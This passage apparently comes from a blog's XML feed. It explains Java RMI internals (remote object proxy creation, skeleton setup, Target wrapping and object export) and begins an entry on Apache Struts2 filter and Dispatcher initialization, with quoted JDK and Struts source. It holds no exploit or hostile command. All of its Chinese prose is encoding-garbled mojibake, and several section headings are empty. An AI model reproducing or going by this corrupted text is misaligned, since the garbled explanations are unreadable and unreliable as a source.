¹ç±»æ˜¯ä¸å­˜åœ¨çš„ï¼Œæ‰€ä»¥è¿™é‡Œä¼šè¿”å›<code>false</code>ï¼Œä»£ç ä¹Ÿä¼šè¿›å…¥åˆ°<code>else</code>çš„é€»è¾‘ä¸­ã€‚é‚£ä¹ˆå½“<code>var3</code>ä¸ºä»€ä¹ˆæ—¶ä¼šè¿›å…¥åˆ°<code>if</code>ç´§è·Ÿç€çš„ä»£ç å—ä¸­å‘¢ã€‚<br>å½“<code>var3</code>è¡¨ç¤º<code>RegistryImpl</code>çš„<code>Class</code>å¯¹è±¡æ—¶ä¼šå‡ºç°è¿™æ ·çš„æƒ…å†µï¼Œè¿™å°†å‘ç”Ÿåœ¨æ³¨å†Œä¸­å¿ƒçš„åˆ›å»ºè¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬åé¢ä¼šä»‹ç»åˆ°çš„ã€‚<br>åœ¨<code>else</code>ç´§è·Ÿç€çš„ä»£ç å—ä¸­ï¼Œæˆ‘ä»¬åˆ›å»ºäº†<code>UnicastRef</code>å¯¹è±¡çš„åŠ¨æ€ä»£ç†å¯¹è±¡ï¼Œä½¿ç”¨çš„<code>invocationHandler</code>ä¸º <code>RemoteObjectInvocationHandler</code>ï¼Œè¿™ä¸€ç‚¹æ˜¯æä¸ºé‡è¦çš„ï¼Œ<br>å› ä¸ºåœ¨åŠ¨æ€ä»£ç†å¯¹è±¡æ‰§è¡Œè¿‡ç¨‹ä¸­<code>invocationHandler</code>çš„<code>invoke</code>æ–¹æ³•ä¼šå½±å“åŸæœ¬å¯¹è±¡æ–¹æ³•æ‰§è¡Œçš„è¡Œä¸ºï¼Œè¯·è®°ä½è¿™ä¸€ç‚¹ã€‚  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Remote <span class="title function_">createProxy</span><span class="params">(Class&lt;?&gt; var0, RemoteRef var1, <span class="type">boolean</span> var2)</span> <span class="keyword">throws</span> StubNotFoundException &#123;</span><br><span class="line">        Class var3;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            var3 = getRemoteClass(var0);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException var9) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StubNotFoundException</span>(<span class="string">&quot;object does not implement a remote interface: &quot;</span> + var0.getName());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (var2 || !ignoreStubClasses &amp;&amp; stubClassExists(var3)) &#123;</span><br><span class="line">            <span class="keyword">return</span> createStub(var3, var1);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">ClassLoader</span> <span class="variable">var4</span> <span class="operator">=</span> var0.getClassLoader();</span><br><span class="line">            <span class="keyword">final</span> Class[] var5 = getRemoteInterfaces(var0);</span><br><span class="line">            <span class="keyword">final</span> <span class="type">RemoteObjectInvocationHandler</span> <span class="variable">var6</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjectInvocationHandler</span>(var1);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> (Remote)AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>&lt;Remote&gt;() &#123;</span><br><span class="line">                    <span class="keyword">public</span> Remote <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span> (Remote)Proxy.newProxyInstance(var4, var5, var6);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IllegalArgumentException var8) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StubNotFoundException</span>(<span class="string">&quot;unable to create proxy&quot;</span>, var8);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>å¯¹äºç”¨æˆ·åˆ›å»ºçš„ç”¨æˆ·æ³¨å†Œçš„è¿œç¨‹å¯¹è±¡æ¥è¯´ï¼Œè°ƒç”¨<code>createProxy</code>æ–¹æ³•åè·å¾—çš„æ˜¯ä¸€ä¸ª<code>UnicastRef</code>çš„åŠ¨æ€ä»£ç†å¯¹è±¡ï¼Œè¯¥å¯¹è±¡å°è£…äº†ä¸€ä¸ª<code>LiveRef</code>å¯¹è±¡ï¼Œ<br>è€Œè¿™ä¸ª<code>LiveRef</code>å¯¹è±¡ä¸­åˆå°è£…äº†ä¸€ä¸ª<code>ObjID</code>å¯¹è±¡ï¼Œè¿™ä¸ª<code>ObjID</code>æ­£æ˜¯å½“å‰åˆ›å»ºè¿œç¨‹å¯¹è±¡çš„å”¯ä¸€æ ‡è¯†ç¬¦ï¼Œåœ¨åé¢çš„æ“ä½œä¸­è°ƒç”¨å®¢æˆ·ç«¯éœ€è¦ä»¥æ¥è¿™ä¸ª<code>ObjID</code>æ¥ä»å¯¼å‡ºè¡¨ä¸­æŸ¥æ‰¾å¯¹åº”çš„è¿œç¨‹å¯¹è±¡ã€‚<br><code>setSkeleton</code>æ–¹æ³•çš„è°ƒç”¨éœ€è¦ç‰¹æ®Šçš„æ—¶æœºï¼Œå³<code>createProxy</code>åˆ›å»ºçš„å­˜æ ¹å¯¹è±¡å®ç°äº†<code>RemoteStub</code>ç±»ï¼Œå¾ˆæ˜æ˜¾æˆ‘ä»¬è‡ªè¡Œåˆ›å»ºçš„è¿œç¨‹å¯¹è±¡çš„å­˜æ ¹å¯¹è±¡æ˜¯æ²¡æœ‰å®ç°è¿™ä¸ªç±»çš„ï¼Œé‚£ä¹ˆä¹Ÿåªæœ‰å‰é¢æåˆ°çš„<code>RegistryImpl_Stub</code>å¯¹è±¡ä¼šå®ç°è¿™ä¸ªç±»äº†ã€‚<br>åœ¨<code>setSkeleton</code>æ–¹æ³•ä¸­ï¼Œå…¶ä¼šåˆ›å»º<code>RegistryImpl</code>çš„éª¨æ¶ï¼Œå³åˆ›å»º<code>RegistryImpl_Skel</code>å¯¹è±¡å¹¶å­˜å‚¨åˆ°<code>UnicastServerRef</code>çš„<code>skeleton</code>æˆå‘˜å˜é‡ä¸­ã€‚  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSkeleton</span><span class="params">(Remote var1)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    <span class="keyword">if</span> (!withoutSkeletons.containsKey(var1.getClass())) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.skel = Util.createSkeleton(var1);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SkeletonNotFoundException var3) &#123;</span><br><span class="line">            withoutSkeletons.put(var1.getClass(), (Object)<span class="literal">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">static</span> Skeleton <span class="title function_">createSkeleton</span><span class="params">(Remote var0)</span> <span class="keyword">throws</span> SkeletonNotFoundException &#123;</span><br><span class="line">        Class var1;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            var1 = getRemoteClass(var0.getClass());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException var8) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SkeletonNotFoundException</span>(<span class="string">&quot;object does not implement a remote interface: &quot;</span> + var0.getClass().getName());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">var2</span> <span class="operator">=</span> var1.getName() + <span class="string">&quot;_Skel&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">var3</span> <span class="operator">=</span> Class.forName(var2, <span class="literal">false</span>, var1.getClassLoader());</span><br><span class="line">            <span class="keyword">return</span> (Skeleton)var3.newInstance();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException var4) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SkeletonNotFoundException</span>(<span class="string">&quot;Skeleton class not found: &quot;</span> + var2, var4);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InstantiationException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SkeletonNotFoundException</span>(<span class="string">&quot;Can&#x27;t create skeleton: &quot;</span> + var2, var5);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException var6) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SkeletonNotFoundException</span>(<span class="string">&quot;No public constructor: &quot;</span> + var2, var6);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassCastException var7) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SkeletonNotFoundException</span>(<span class="string">&quot;Skeleton not of correct class: &quot;</span> + var2, var7);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><code>BindObject</code>å¯¹è±¡å³æ˜¯æˆ‘ä»¬é•¿åœ¨åˆ›å»ºçš„è¿œç¨‹å¯¹è±¡ï¼Œåé¢ä¸åœ¨ä½¿ç”¨<code>æ­£åœ¨åˆ›å»ºçš„è¿œç¨‹å¯¹è±¡</code>è¿™ä¸ªè¯´æ³•è€Œç›´æ¥ä½¿ç”¨<code>BindObject</code>å¯¹è±¡ä»£æ›¿ã€‚<br>åœ¨è¿›è¡Œ<code>Target</code>å¯¹è±¡çš„å°è£…æ—¶ï¼Œé¦–å…ˆä¼šåˆ›å»º<code>BindObject</code>å¯¹è±¡çš„å¼±å¼•ç”¨, åˆ›å»ºæ—¶ä¼ å…¥çš„ç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¸€ä¸ªé˜Ÿåˆ—ï¼Œå½“<code>BindObject</code>å¯¹è±¡è¢«<code>GC</code>å›æ”¶æ—¶,ä¼šå°†å¼±å¼•ç”¨å¯¹è±¡åŠ å…¥åˆ°è¿™ä¸ªé˜Ÿåˆ—ä¸­ï¼Œ<br>é€šè¿‡å¯¹è¿™ä¸ªé˜Ÿåˆ—çš„ç›‘å¬å¯ä»¥å®šåˆ¶æŸä¸ªå¯¹è±¡è¢«å›æ”¶æ—¶çš„è¡Œä¸ºï¼Œè¿™æ˜¯ä¸<code>DGC</code>æœ‰å…³çš„å†…å®¹äº†è¿™é‡Œä¸è¿›è¡Œè¯¦è¿°ï¼Œåé¢ä¼šå†å¼€ä¸€ç¯‡ä¸“é—¨ä»‹ç»<code>RMI</code>ä¸­çš„<code>DGC</code>ã€‚<br>ä¼ å…¥çš„ç¬¬äºŒä¸ªå‚æ•°ä¸º<code>UnicastServerRef</code>å¯¹è±¡æœ¬èº«ï¼Œå…¶æ­¤æ—¶ä½œä¸ºæ¶ˆæ¯çš„åˆ†å‘å™¨è¢«ä¼ é€’ï¼Œåé¢å½“æœåŠ¡å™¨æ¥å—åˆ°å®¢æˆ·ç«¯çš„æ¶ˆæ¯æ—¶å°†ç”±è¯¥å¯¹è±¡å¯¹æ¶ˆæ¯è¿›è¡Œåˆ†å‘ä¸å¤„ç†ã€‚<br>ä¼ å…¥çš„ç¬¬ä¸‰ä¸ªå‚æ•°ä½œä¸º<code>BindObject</code>å¯¹è±¡çš„å­˜æ ¹ï¼Œå…¶æœ¬èº«æ˜¯ä¸€ä¸ª<code>UnicastRef</code>çš„åŠ¨æ€ä»£ç†å¯¹è±¡ã€‚<br>ä¼ å…¥çš„ç¬¬å››ä¸ªå‚æ•°æ˜¯<code>ObjID</code>å¯¹è±¡ï¼Œå…¶è¡¨ç¤ºè¿œç¨‹å¯¹è±¡çš„å”¯ä¸€æ ‡è¯†ç¬¦ã€‚<br>ä¼ å…¥çš„ç¬¬äº”ä¸ªå‚æ•°è¡¨ç¤ºè¿œç¨‹å¯¹è±¡æ˜¯å¦æ˜¯æŒä¹…çš„ï¼Œå¦‚æœä¸º<code>true</code>åˆ™è¡¨ç¤ºè¿œç¨‹å¯¹è±¡æ˜¯æŒä¹…çš„ï¼Œå¦åˆ™è¡¨ç¤ºè¿œç¨‹å¯¹è±¡æ˜¯ä¸´æ—¶çš„ã€‚æˆ‘ä»¬è‡ªè¡Œåˆ›å»ºçš„è¿œç¨‹å¯¹è±¡è¯¥å‚æ•°å‡ä¸º<code>false</code>ï¼Œå³ä¸æ˜¯æŒä¹…çš„å¯¹è±¡ã€‚<br>å…¶ä½œä¸ºå¼±å¼•ç”¨è¢«<code>Target</code>å¯¹è±¡å¼•ç”¨ï¼Œå½“æ²¡æœ‰å…¶ä»–å¯¹è±¡å¼•ç”¨æ—¶å°†è¢«<code>GC</code>å›æ”¶æ‰ï¼Œè€ŒæŒä¹…å­˜åœ¨çš„å¯¹è±¡åˆ™åªæœ‰ç³»ç»Ÿåˆ›å»ºçš„<code>RegistryImpl</code>ä»¥åŠ<code>DGCImpl</code>å¯¹è±¡ã€‚<br><code>pinImpl</code>æ–¹æ³•å°±æ˜¯ç”¨æ¥è¿›è¡Œå¯¹è±¡æŒä¹…åŒ–çš„æ–¹æ³•ï¼Œå…¶æœ¬è´¨å°±æ˜¯åˆ›å»ºäº†ä¸€ä¸ªä½¿ç”¨<code>=</code>å·çš„èµ‹å€¼æ“ä½œæ¥å¯¹è¿œç¨‹å¯¹è±¡è¿›è¡Œå¼•ç”¨ï¼Œåªè¦<code>Target</code>å¯¹è±¡ä¸è¢«å›æ”¶ï¼Œè¯¥è¿œç¨‹å¯¹è±¡å°†ä¸€ç›´å­˜åœ¨ã€‚  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">Target</span><span class="params">(Remote var1, Dispatcher var2, Remote var3, ObjID var4, <span class="type">boolean</span> var5)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.weakImpl = <span class="keyword">new</span> <span class="title class_">WeakRef</span>(var1, ObjectTable.reapQueue);</span><br><span class="line">        <span class="built_in">this</span>.disp = var2;</span><br><span class="line">        <span class="built_in">this</span>.stub = var3;</span><br><span class="line">        <span class="built_in">this</span>.id = var4;</span><br><span class="line">        <span class="built_in">this</span>.acc = AccessController.getContext();</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">var6</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">var7</span> <span class="operator">=</span> var1.getClass().getClassLoader();</span><br><span class="line">        <span class="keyword">if</span> (checkLoaderAncestry(var6, var7)) &#123;</span><br><span class="line">            <span class="built_in">this</span>.ccl = var6;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.ccl = var7;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.permanent = var5;</span><br><span class="line">        <span class="keyword">if</span> (var5) &#123;</span><br><span class="line">            <span class="built_in">this</span>.pinImpl();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>å°¾å·´å¤„ç†å®Œäº†ï¼Œæˆ‘ä»¬æ¥ç€çœ‹å¯¹è±¡çš„å¯¼å‡ºæ“ä½œæ˜¯ä»€ä¹ˆæ ·çš„ã€‚<br><code>ep</code>ä»¥åŠ<code>transport</code>éƒ½æ˜¯å†<code>LiveRef</code>å®ä¾‹åŒ–è¿‡ç¨‹ä¸­åˆ›å»ºçš„å¯¹è±¡ï¼Œéœ€è¦äº†è§£çš„å¯ä»¥å€’å›å»çœ‹çœ‹ã€‚  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">exportObject</span><span class="params">(Target var1)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="built_in">this</span>.ep.exportObject(var1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">exportObject</span><span class="params">(Target var1)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    <span class="built_in">this</span>.transport.exportObject(var1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>ä¸‹é¢å°±æ˜¯æœ€ä¸ºæ ¸å¿ƒçš„å¯¹è±¡å¯¼å‡ºæ–¹æ³•äº†ï¼Œè¯¥æ–¹æ³•åŒ…å«é‡è¦çš„ä¸¤ä¸ªæ­¥éª¤ï¼Œå…¶ä¸€æ˜¯å®Œæˆ<code>serverSocket</code>æœåŠ¡çš„å»ºç«‹ï¼Œå…¶äºŒæ˜¯è¿›è¡ŒçœŸæ­£çš„å¯¹è±¡å¯¼å‡ºã€‚  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">exportObject</span><span class="params">(Target var1)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">synchronized</span>(<span class="built_in">this</span>) &#123;</span><br><span class="line">            <span class="built_in">this</span>.listen();</span><br><span class="line">            ++<span class="built_in">this</span>.exportCount;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">var12</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            var12 = <span class="literal">true</span>;</span><br><span class="line">            <span class="built_in">super</span>.exportObject(var1);</span><br><span class="line">            var2 = <span class="literal">true</span>;</span><br><span class="line">            var12 = <span class="literal">false</span>;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (var12) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!var2) &#123;</span><br><span class="line">                    <span class="keyword">synchronized</span>(<span class="built_in">this</span>) &#123;</span><br><span class="line">                        <span class="built_in">this</span>.decrementExportCount();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!var2) &#123;</span><br><span class="line">            <span class="keyword">synchronized</span>(<span class="built_in">this</span>) &#123;</span><br><span class="line">                <span class="built_in">this</span>.decrementExportCount();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>é¦–å…ˆå…³æ³¨<code>serverSocket</code>çš„å»ºç«‹ã€‚  </p>
<h1 id="æ³¨å†Œä¸­å¿ƒæ˜¯å¦‚ä½•å¯åŠ¨çš„"><a href="#æ³¨å†Œä¸­å¿ƒæ˜¯å¦‚ä½•å¯åŠ¨çš„" class="headerlink" title="æ³¨å†Œä¸­å¿ƒæ˜¯å¦‚ä½•å¯åŠ¨çš„"></a>æ³¨å†Œä¸­å¿ƒæ˜¯å¦‚ä½•å¯åŠ¨çš„</h1><h1 id="å®¢æˆ·ç«¯è·å–æ³¨å†Œä¸­å¿ƒå­˜æ ¹"><a href="#å®¢æˆ·ç«¯è·å–æ³¨å†Œä¸­å¿ƒå­˜æ ¹" class="headerlink" title="å®¢æˆ·ç«¯è·å–æ³¨å†Œä¸­å¿ƒå­˜æ ¹"></a>å®¢æˆ·ç«¯è·å–æ³¨å†Œä¸­å¿ƒå­˜æ ¹</h1><h1 id="å®¢æˆ·ç«¯æŸ¥è¯¢è¿œç¨‹å¯¹è±¡"><a href="#å®¢æˆ·ç«¯æŸ¥è¯¢è¿œç¨‹å¯¹è±¡" class="headerlink" title="å®¢æˆ·ç«¯æŸ¥è¯¢è¿œç¨‹å¯¹è±¡"></a>å®¢æˆ·ç«¯æŸ¥è¯¢è¿œç¨‹å¯¹è±¡</h1><h1 id="å®¢æˆ·ç«¯è°ƒç”¨è¿œç¨‹å¯¹è±¡æ–¹æ³•"><a href="#å®¢æˆ·ç«¯è°ƒç”¨è¿œç¨‹å¯¹è±¡æ–¹æ³•" class="headerlink" title="å®¢æˆ·ç«¯è°ƒç”¨è¿œç¨‹å¯¹è±¡æ–¹æ³•"></a>å®¢æˆ·ç«¯è°ƒç”¨è¿œç¨‹å¯¹è±¡æ–¹æ³•</h1><h1 id="DGC"><a href="#DGC" class="headerlink" title="DGC"></a>DGC</h1><h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
      <categories>
        <category>æ¼æ´åŸç†</category>
      </categories>
      <tags>
        <tag>RMI</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache Struts2 åŸç†å­¦ä¹ </title>
    <url>/archives/66a16759.html</url>
    <content><![CDATA[<h1 id="è¿‡æ»¤å™¨åˆå§‹åŒ–"><a href="#è¿‡æ»¤å™¨åˆå§‹åŒ–" class="headerlink" title="è¿‡æ»¤å™¨åˆå§‹åŒ–"></a>è¿‡æ»¤å™¨åˆå§‹åŒ–</h1><p>Struts2 çš„è®¿é—®ä»é…ç½®çš„<code>org.apache.struts2.dispatcher.filter.StrutsPrepareAndExecuteFilter</code>è¿‡æ»¤å™¨å¼€å§‹ã€‚<br>è¿‡æ»¤å™¨åœ¨ç¨‹åºåŠ è½½è¿‡ç¨‹ä¸­é¦–å…ˆè¢«æ‰§è¡Œçš„æ˜¯<code>init</code>æ–¹æ³•  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">    <span class="comment">// åˆ›å»º InitOperations å¯¹è±¡ è´Ÿè´£å„ä¸ªå…³é”®ç»„ä»¶çš„åˆå§‹åŒ–æ“ä½œ</span></span><br><span class="line">        <span class="type">InitOperations</span> <span class="variable">init</span> <span class="operator">=</span> createInitOperations(); </span><br><span class="line">        <span class="type">Dispatcher</span> <span class="variable">dispatcher</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// ç®€å•çš„åŒ…è£…äº†ä¸€ä¸‹ filterConfig</span></span><br><span class="line">        <span class="type">FilterHostConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterHostConfig</span>(filterConfig);</span><br><span class="line">        <span class="comment">// åˆå§‹åŒ–æ—¥å¿—è®°å½•å™¨  ä¸æ˜¯é‡ç‚¹</span></span><br><span class="line">        init.initLogging(config);</span><br><span class="line">        <span class="comment">// åˆå§‹åŒ–dispatcher é‡ç‚¹</span></span><br><span class="line">        dispatcher = init.initDispatcher(config);</span><br><span class="line">        <span class="comment">// åˆå§‹åŒ–é™æ€ç±»å®¹åŠ è½½å™¨</span></span><br><span class="line">        init.initStaticContentLoader(config, dispatcher);</span><br><span class="line">        </span><br><span class="line">        prepare = createPrepareOperations(dispatcher);</span><br><span class="line">        execute = createExecuteOperations(dispatcher);</span><br><span class="line">        <span class="comment">// è®¾ç½®å°†å“ªäº›pathæ’é™¤åˆ°strutsdçš„filterä¹‹å¤– è¿™äº›è¯·æ±‚å°†ä¸ä¼šè¢«strutså¤„ç† è€Œäº¤ç»™ä¹‹åçš„filteræˆ–è€…servletå¤„ç†</span></span><br><span class="line">        <span class="built_in">this</span>.excludedPatterns = init.buildExcludedPatternsList(dispatcher);</span><br><span class="line">        <span class="comment">// ç”¨æˆ·å¯ä»¥ç»§æ‰¿è¯¥è¿‡æ»¤å™¨ é‡å†™è¯¥æ–¹æ³• åšä¸€äº›é¢å¤–çš„åˆå§‹åŒ–æ“ä½œ</span></span><br><span class="line">        postInit(dispatcher, filterConfig);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (dispatcher != <span class="literal">null</span>) &#123;</span><br><span class="line">        dispatcher.cleanUpAfterInit();</span><br><span class="line">        &#125;</span><br><span class="line">        init.cleanup();</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<span id="more"></span>
<h2 id="Dispatcher-åˆå§‹åŒ–"><a href="#Dispatcher-åˆå§‹åŒ–" class="headerlink" title="Dispatcher åˆå§‹åŒ–"></a>Dispatcher åˆå§‹åŒ–</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Dispatcher <span class="title function_">initDispatcher</span><span class="params">( HostConfig filterConfig )</span> &#123;</span><br><span class="line">    <span class="comment">// åˆ›å»ºDispatcher è®¾ç½®äº†servletContextä¸initParams </span></span><br><span class="line">        <span class="type">Dispatcher</span> <span class="variable">dispatcher</span> <span class="operator">=</span> createDispatcher(filterConfig);</span><br><span class="line">        <span class="comment">// æ‰§è¡Œåˆå§‹åŒ– é‡ç‚¹</span></span><br><span class="line">        dispatcher.init();</span><br><span class="line">        <span class="keyword">return</span> dispatcher;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    	<span class="keyword">if</span> (configurationManager == <span class="literal">null</span>) &#123;</span><br><span class="line">    		configurationManager = createConfigurationManager(Container.DEFAULT_NAME);</span><br><span class="line">    	&#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// æ‰§è¡Œæ–‡ä»¶æ˜ å°„å™¨çš„åˆå§‹åŒ–</span></span><br><span class="line">            init_FileManager();</span><br><span class="line">            <span class="comment">// æ‰§è¡Œé»˜è®¤å±æ€§çš„åˆå§‹åŒ– ä½äºjaråŒ…ä¸­çš„é»˜è®¤å±æ€§</span></span><br><span class="line">            init_DefaultProperties(); <span class="comment">// [1]</span></span><br><span class="line">        <span class="comment">// æ‰§è¡Œé…ç½®æ–‡ä»¶çš„åˆå§‹åŒ– åŒ…æ‹¬ struts.xml struts-plugin.xml ç­‰</span></span><br><span class="line">            init_TraditionalXmlConfigurations(); <span class="comment">// [2]</span></span><br><span class="line">        <span class="comment">// æ‰§è¡Œè‡ªå®šä¹‰é…ç½®æ–‡ä»¶çš„åˆå§‹åŒ– è‡ªå®šä¹‰çš„ struts.properties å±æ€§çš„åˆå§‹åŒ–</span></span><br><span class="line">        <span class="comment">// è¿™ä¸ªæ–‡ä»¶æ˜¯ç”¨äºå¼•ç”¨å…¶ä»–çš„é…ç½®æ–‡ä»¶çš„</span></span><br><span class="line">            init_LegacyStrutsProperties(); <span class="comment">// [3]</span></span><br><span class="line">            init_CustomConfigurationProviders(); <span class="comment">// [5]</span></span><br><span class="line">            init_FilterInitParameters() ; <span class="comment">// [6]</span></span><br><span class="line">            init_AliasStandardObjects() ; <span class="comment">// [7]</span></span><br><span class="line"></span><br><span class="line">            <span class="type">Container</span> <span class="variable">container</span> <span class="operator">=</span> init_PreloadConfiguration();</span><br><span class="line">            container.inject(<span class="built_in">this</span>);</span><br><span class="line">            init_CheckWebLogicWorkaround(container);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!dispatcherListeners.isEmpty()) &#123;</span><br><span class="line">                <span class="keyword">for</span> (DispatcherListener l : dispatcherListeners) &#123;</span><br><span class="line">                    l.dispatcherInitialized(<span class="built_in">this</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            errorHandler.init(servletContext);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">            LOG.error(<span class="string">&quot;Dispatcher initialization failed&quot;</span>, ex);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StrutsException</span>(ex);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="æ–‡ä»¶æ˜ å°„å™¨åˆå§‹åŒ–"><a href="#æ–‡ä»¶æ˜ å°„å™¨åˆå§‹åŒ–" class="headerlink" title="æ–‡ä»¶æ˜ å°„å™¨åˆå§‹åŒ–"></a>æ–‡ä»¶æ˜ å°„å™¨åˆå§‹åŒ–</h3><p>ä¸»è¦åŠŸèƒ½æ˜¯æ„å»ºäº†æ–‡ä»¶ç®¡ç†å™¨ä¸æ–‡ä»¶ç®¡ç†å™¨å·¥å‚<br>æ–‡ä»¶ç®¡ç†å™¨å·¥å‚åœ¨æŸ¥æ‰¾æ–‡ä»¶çš„æ—¶å€™é¦–å…ˆä¼šå°è¯•ä»å®¹å™¨ä¸­æŸ¥æ‰¾æ˜¯å¦é…ç½®äº†æ–‡ä»¶ç®¡ç†å™¨ï¼Œå¦‚æœæ²¡æœ‰æ‰¾åˆ°ï¼Œåˆ™ä¼šæŸ¥æ‰¾å­˜å‚¨åœ¨å·¥å‚ä¸­çš„systemFileManager è¿™ä¸ªsystemFileManageråº”è¯¥ä¹Ÿæ˜¯åœ¨beanå®¹å™¨åˆå§‹åŒ–çš„æ—¶å€™è¢«æ³¨å…¥çš„  </p>
